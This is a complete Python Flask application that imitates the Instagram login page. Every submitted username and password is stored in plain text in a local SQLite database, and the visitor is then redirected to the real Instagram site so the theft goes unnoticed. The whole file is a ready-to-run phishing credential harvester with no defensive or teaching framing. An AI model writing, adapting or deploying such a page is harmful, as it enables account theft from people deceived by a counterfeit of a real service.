from flask import Flask, request, render_template_string, redirect

import sqlite3

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect("users_plain.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Login page</title>
    <style>
        body {
            background: #fafafa;
            font-family: Arial, sans-serif;
        }
        .login-container {
            width: 350px;
            margin: 100px auto;
            padding: 30px;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            text-align: center;
        }
        .logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 42px;
            margin-bottom: 20px;
            color: #262626;
        }
        .demo {
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: #3897f0;
            border: none;
            color: white;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }
        button:hover {
            background: #318ce7;
        }
        .msg {
            margin-top: 15px;
            color: green;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">Instagram</div>
    <div class="demo"> Login Page</div>

    <form method="post">
        <input type="text" name="username" placeholder="Phone number, email or username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    {% if msg %}
    <div class="msg">{{ msg }}</div>
    {% endif %}
</div>

</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        conn = sqlite3.connect("users_plain.db")
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO users (username, password) VALUES (?, ?)",
            (username, password)
        )
        conn.commit()
        conn.close()

        # REDIRECT to Instagram website
        return redirect("https://www.instagram.com/")

    return render_template_string(HTML, msg="")


if __name__ == "__main__":
    app.run(debug=True)
